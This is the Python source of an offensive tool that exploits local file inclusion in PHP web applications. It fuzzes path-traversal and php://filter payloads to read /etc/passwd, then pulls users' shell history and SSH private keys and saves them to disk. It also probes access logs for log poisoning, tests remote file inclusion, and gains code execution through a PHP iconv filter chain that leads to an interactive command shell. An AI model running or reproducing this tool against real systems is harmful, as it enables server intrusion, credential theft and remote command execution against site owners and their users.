import requests
import re
import base64
import argparse
import sys
from require import *
import urllib.parse
from urllib.parse import urlparse
import os
import posixpath
from lfi_service_dettector import *

users = []
file_to_use = "php://temp"
TIMEOUT_VALUE = 20
session_cookies = {}
Size_Responses = []
VAILD_FILE_NAME = ""
web_root = "/var/www/html"
Base_URL = ""
Service_Dettector_Mode = False
Threads = 0
PORT = 0


print(banner)







def normal_state(url,vaild_file):

    res = requests.get(url=url,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    Size_Responses.append(len(res.text.strip()))


    url_with_vaild_file = url + vaild_file
    res = requests.get(url=url_with_vaild_file,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    Size_Responses.append(len(res.text.strip()))




    url_with_out_parameter = url.split('?')
    url_with_out_parameter = url_with_out_parameter[0]
    res = requests.get(url=url_with_out_parameter,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    Size_Responses.append(len(res.text.strip()))

    
    url_with_not_vaild_name = url + "NotVaildFile"
    res = requests.get(url=url_with_not_vaild_name,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    Size_Responses.append(len(res.text.strip()))




def response_size_compare(response):
    content_length = len(response.text.strip())
    if content_length not in Size_Responses :
        return True
    else:
        return False



def check_access_log(payload=""):
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access_log",
        "/var/log/apache/access.log"
    ]
    print(LINE)
    print(f"\n\t{BOLD}Checking Access To Apache/HTTPD Logs{RESET}\n")
    found = False
    if payload:   
        for path in log_paths:
            payload = payload.replace("/etc/passwd", path)
            try:
                res = requests.get(url=payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
                content = res.text.strip()
                if "HTTP/" in content and "etc/passwd" in content:
                    print(f" {SUCCESS} Logs is Accessible at: '{path}'")
                    print(f" {PAYLOADC} -> '{payload}'")
                    print(f" {WARN} Test-Manually : Log Poisoning!\n")
                    print(LINE)
                    found = True
                    break 
            except Exception:
                continue
        if not found:
            print(f" {ERROR} Failed to Access access.log (File not found or Permission Denied)\n")
            print(LINE)
    else:
        for path in log_paths:
            for payload in Payloads:
                payload = payload.replace("/etc/passwd",path)
                payload = Base_URL + payload 
                
                try:
                    res = requests.get(url=payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
                    content = res.text.strip()
                    if "HTTP/" in content and "etc/passwd" in content:
                        print(f" {SUCCESS} Logs is Accessible at: '{path}'")
                        print(f" {PAYLOADC} -> '{payload}'")
                        print(f" {WARN} Test-Manually : Log Poisoning!\n")
                        print(LINE)
                        found = True
                        break 
                except Exception:
                    continue
        if not found:
            print(f" {ERROR} Failed to Access access.log (File not found or Permission Denied)\n")
            print(LINE)
    


def Testing_passwd_file(payload):
    res = requests.get(url=payload, cookies=session_cookies)
    response_content = res.text.strip()
    if "root" in response_content:
        # Extract Users From /etc/passwd
        Test_LFI(payload)
        
        return True
    else:
        return False
    
    
    
def Test_LFI(payload):
    Extract_Real_Users(payload)
    # Testing the Access to Access Log File
    check_access_log(payload)
    # Extract Hostname
    Extract_hostname(payload)
    # Extract SSH Keys for founds users
    Extract_user_ssh_keys(payload)
    # Test for Remote file Inclusion
    #test_rfi()
    # Extract users History Files
    Extract_history_files(payload)
    # Testing RCE Via ICONV PHP Filter
    testing_rce()

def Extract_history_files(payload):
    history_files = [".bash_history", ".zsh_history"]
    if users:
        print(LINE)
        print(f"\n\t{BOLD}Extracting User's History Files{RESET}\n")
        found_any = False
        for user in users:
            for history_file in history_files:
                history_file_payload = payload.replace("etc/passwd", f"home/{user}/{history_file}")
                try:
                    res = requests.get(url=history_file_payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
                    different_in_response = response_size_compare(res)
                    if res.status_code == 200 and different_in_response:
                        print(f" {INFO} There is Different of Response Size for User '{user}'")
                        print(f" {PAYLOADC} -> '{history_file_payload}'")
                        found_any = True
                except Exception:
                    continue
        if not found_any:
            print(f" {ERROR} Access Denied | History Files Not Found")
    print(LINE)



def get_index_url():
    parsed = urlparse(Base_URL)
    directory = posixpath.dirname(parsed.path)
    php_index_file_path = posixpath.join(directory, "index.php")
    php_index_file_path = f"{parsed.scheme}://{parsed.netloc}{php_index_file_path}"
    res = requests.get(url=php_index_file_path,cookies=session_cookies, timeout=TIMEOUT_VALUE)
    if res.status_code in [200,302,301,401]:
        return True
    else :
        return False
    
    


def testing_base64_encode_filter():
    print(LINE)
    print(f"\n\t{BOLD}Testing base64 filter LFI{RESET}\n")
    targets = []
    php_index_file_exists = get_index_url()
    if php_index_file_exists:
        targets.append("index.php")
    else:
        print("\n\nfffffffffffffffffff\n\n")
    # check if user provided php file
    if VAILD_FILE_NAME and VAILD_FILE_NAME.endswith(".php"):
        targets.append(VAILD_FILE_NAME)

    # extract page name from URL
    current_page_name = Base_URL.split("/")[-1].split("?")[0]
    targets.append(current_page_name)
    
    # Current Page with out '.php' if the Tatget is Already Add it
    current_page_with_no_extension = current_page_name.split('.')[0]
    targets.append(current_page_with_no_extension)
    
    
    
    
    
    for file in targets:
        payload = f"{Base_URL}php://filter/convert.base64-encode/resource={file}"
        try:
            res = requests.get(url=payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
            content = res.text
            # remove HTML if exists
            clean_response = re.sub(r"<.*?>", "", content)
            # Extract possible base64 strings
            base64_candidates = re.findall(r"[A-Za-z0-9+/=]+", clean_response)
            for candidate in base64_candidates:
                try:
                    decoded = base64.b64decode(candidate).decode("utf-8", errors="ignore")
                    if "<?php" in decoded:
                        print(f" {SUCCESS} LFI confirmed via base64 filter!")
                        print(f" {PAYLOADC} -> {payload}")
                        filename = f"decoded_{file}"
                        with open(filename, "w") as f:
                            f.write(decoded)

                        print(f" {WARN} saved decoded file -> {filename}")
                        if not filename.endswith(".php"):
                            print(f" {INFO} The Application May Add '.php' Extension in the Backend")
                        return True
                except Exception:
                    pass
        except Exception:
            continue
    print(f" {ERROR} Base64 filter LFI not detected")
    return False



    
    

    

    

def Extract_hostname(payload=""):
    if payload != "" :
        payload = payload.replace("passwd", "hostname") 
        print(f"\n {PAYLOADC} Get Hostname  -> '{payload}'")
        print(LINE)
    else:   
        for payload in Payloads:
            payload = payload.replace('passwd','hostname')
            payload = Base_URL + payload
        
            res = requests.get(url=payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
            response_content = res
            different_in_response = response_size_compare(res)
            if any(error in response_content.text.lower() for error in ERROR_INDICATORS):
                print(LINE)
                print(f"\n {INFO} Detect Errors Indicators")
                print(f" {PAYLOADC} Get Hostname  -> '{payload}'")
                break
            elif res.status_code == 200 and different_in_response:
                print(LINE)
                print(f"\n {INFO} There is Different in Response Size")
                print(f" {PAYLOADC} Get Hostname  -> '{payload}'")
            
                
                break
        
  


def Extract_user_ssh_keys(payload):
    ssh_files = [
        ".ssh/id_rsa", 
        ".ssh/id_ed25519", 
        ".ssh/id_ecdsa", 
        ".ssh/id_dsa",
        ".ssh/authorized_keys"
    ]
    
    if 'users' in globals() and users:
        
        print(f"\n\t{BOLD}Enumeration User's SSH Keys{RESET}\n")
        found_any_key = False
        
        for user in users:
            print(f" - Checking user: {CYAN}{user}{RESET}")
            
            for ssh_file in ssh_files:
                base_path = f"root/{ssh_file}" if user == "root" else f"home/{user}/{ssh_file}"
                ssh_key_payload = payload.replace("etc/passwd", base_path)
                
                try:
                    res = requests.get(url=ssh_key_payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
                    content = res.text
                    
                    
                    is_valid_key = ("-----BEGIN" in content) or any(marker in content for marker in ["ssh-rsa", "ssh-ed25519"])
                    
                    if res.status_code == 200 and not any(error in content.lower() for error in ERROR_INDICATORS) and is_valid_key:
                        clean_content = re.sub(r'<[^>]+>', '', content).strip()
                        
                        
                        final_key = ""
                        if "-----BEGIN" in clean_content:
                            start_index = clean_content.find("-----BEGIN")
                            end_marker = "-----END"
                            end_index = clean_content.find(end_marker)
                            
                            if end_index != -1:
                                temp_content = clean_content[start_index:]
                                lines = temp_content.splitlines()
                                final_lines = []
                                for line in lines:
                                    final_lines.append(line)
                                    if end_marker in line:
                                        break
                                final_key = "\n".join(final_lines)
                            else:
                                final_key = clean_content[start_index:]
                        else:
                            lines = clean_content.splitlines()
                            final_key = "\n".join([line.strip() for line in lines if line.strip().startswith("ssh-")])

                        if final_key:
                            file_type = "Private_Key" if "-----BEGIN" in final_key else "Public_Key"
                            print(f" {SUCCESS} File '{file_type}' Found for User: {CYAN}{user}{RESET}")
                            print(f" {PAYLOADC} -> : '{ssh_key_payload}'")
                            
                            clean_filename = f"ssh_{user}_{ssh_file.replace('.ssh/', '')}.txt"
                            with open(clean_filename, "w") as f:
                                f.write(final_key.strip())
                            
                            print(f" {WARN} - Key saved to: {clean_filename}")
                            found_any_key = True
                            
                except Exception:
                    continue
        
        if not found_any_key:
            print(f"\n{ERROR} Access Denied | SSH Keys Not Founds\n")
    
    


def Extract_Real_Users(payload):
    print(LINE)
    print(f"\n\t{BOLD}Extract Users From /etc/passwd{RESET}\n")
    
    res = requests.get(url=payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
    response_content = res.text.strip()
    
    clean_text = re.sub(r'<[^>]+>', '', response_content)
    lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
    user_pattern = r"^([^:]+):.*(/bin/bash|/bin/sh|/bin/zsh|/sh|/bash)$"
    found_users = []
    for line in lines:
        match = re.search(user_pattern, line)
        if match:
            user = match.group(1)
            if user not in users:
                users.append(user)
            found_users.append(user)
            print(f" . {CYAN}{user}{RESET}")
            

    if not found_users:
        print("None User Found")
    else:
        print(f"\n {SUCCESS} Found Users : {len(found_users)} ")
        print(f" {PAYLOADC}'{payload}'")

    if Service_Dettector_Mode:
        print(LINE)
        print(f"\n\t{BOLD}Running Service Identifier{RESET}\n")
        start_service_dettect(payload, PORT, Threads)
        print(LINE)





def test_rfi():
    print(LINE)
    print(f"\n\t{BOLD}Testing for RFI (Remote File Inclusion) {RESET}\n")
    test_url = "https://www.google.com/robots.txt"
    
    try:
        payload = Base_URL + test_url
        res = requests.get(url=payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
        content = res.text
        if res.status_code == 200  and "User-agent: *" in content and not any(error in content.lower() for error in ERROR_INDICATORS):
            
            print(f" {SUCCESS} -  RFI Vulnerability Confirmed! , Extrnal links Allowed")
            print(f" {PAYLOADC}'{payload}'")
            print("🚀 Server is fetching and rendering remote URLs.")
        else:
            print(f"{ERROR} - RFI Seems to be Disabled")
    except Exception as e:
        print(f" {ERROR} Failed To Confirm RFI : {e}")
    
    
        

def testing_rce():
    print(f"\n\t{BOLD}Testing for RCE via iconv filter{RESET}\n")
    checking_rce_payload = f"{Base_URL}{iconv_filter_exexute_id}"
    res = requests.get(url=checking_rce_payload, cookies=session_cookies)
    print(res.text)
    if "uid" in res.text.strip():
        print(f" {SUCCESS} - RCE Found")
        print(f" ID -> {res.text.strip()}")
        print(LINE)
        open_shell()
    else:
        print(f"Command Execution Failed")
        print(LINE)

def open_shell():
    print("\n" + "="*50)
    print(f" {BGREEN}>>> Interactive PHP Filter Chain Shell <<< {RESET}")
    print(" (type 'exit' to quit | Ctrl+C to stop)")
    print("="*50)
    try:
        while True:
            shell_command = input("Shell> ").strip()
            if not shell_command: continue
            if shell_command.lower() in ['exit', 'quit']: break
            php_command = r"<?php system('cmd');\n ?>"
            php_command = php_command.replace('cmd', shell_command)
            chain = php_command.encode('utf-8')
            base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
            ready_payload = generate_filter_chain(base64_value)
            Exexute_hacker_command(ready_payload)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted.")
    except Exception as e:
        print(f"\n[!] Error: {e}")

def generate_filter_chain(chain, debug_base64 = False):
    encoded_chain = chain
    filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        filters += "convert.base64-decode"
    return f"php://filter/{filters}/resource={file_to_use}"

def Exexute_hacker_command(command):
    rce_command_payload = f"{Base_URL}{command}"
    res = requests.get(url=rce_command_payload, cookies=session_cookies)
    print(LINE)
    print(res.text.strip())
    print(LINE)

def generate_custom_lfi_payload(url,exsist_file):
    target_file="etc/passwd"
    parsed_url = urlparse(url)
    traversal = "../" * 5
    double_traversal = "....//" * 5
    Payloads.append(f"{web_root}/{traversal}{target_file}")
    Payloads.append(f"{web_root}/{double_traversal}{target_file}")
    Payloads.append(f"/{double_traversal}{target_file}")
    Payloads.append(f"/{double_traversal}{target_file}")
    Payloads.append(f"{exsist_file}/{traversal}/{target_file}")
    Payloads.append(f"{exsist_file}/{double_traversal}/{target_file}")
    Payloads.append(f"{exsist_file}/{double_traversal}{target_file}")
    Payloads.append(f"php://filter/convert.base64-encode/resource={exsist_file}/{traversal}{target_file}")
    Payloads.append(f"php://filter/convert.base64-encode/resource={exsist_file}/{double_traversal}{target_file}")
    
    


def parse_cookies(cookie_string):
    cookies = {}
    if cookie_string:
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
    return cookies

def take_args():
    global Base_URL, VAILD_FILE_NAME
    parser = argparse.ArgumentParser(description="Recon + Payload Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--cookie", help="Cookie header")
    parser.add_argument("-f", "--file", required=True , help="Please Enter Exsists and Valid File")
    parser.add_argument("-s", "--service",action="store_true", help="Service Dettector Mode")
    parser.add_argument("-p", "--port",type=int, help="The Port of Knwon Service")
    parser.add_argument("-t", "--threads",type=int,default=10, help="Threads Count used to Find the Knwon Service")

    
    args = parser.parse_args()
    global session_cookies, Base_URL ,Threads,PORT,Service_Dettector_Mode
    if args.cookie:
        session_cookies = parse_cookies(args.cookie)
    if args.file:
        VAILD_FILE_NAME = args.file
        generate_custom_lfi_payload(Base_URL,VAILD_FILE_NAME)
    if args.url:
        Base_URL = args.url
    if args.service and args.port and args.port != "":
        Service_Dettector_Mode = True
        PORT = args.port
        Threads = args.threads


    
        




if __name__ == "__main__":
    take_args()
    passwd_extract_success = False
    normal_state(Base_URL,VAILD_FILE_NAME)
    testing_base64_encode_filter()
    for payload in Payloads:
        encoded_payload = urllib.parse.quote(payload, safe="/%")
        full_url = Base_URL + encoded_payload
        passwd_extract_success = Testing_passwd_file(full_url)
        if passwd_extract_success:
            break
    if not passwd_extract_success:
        Extract_hostname()
        check_access_log()
        testing_rce()
        
    
            
            
                
       
        
        



                                                                                              
                                                                                              
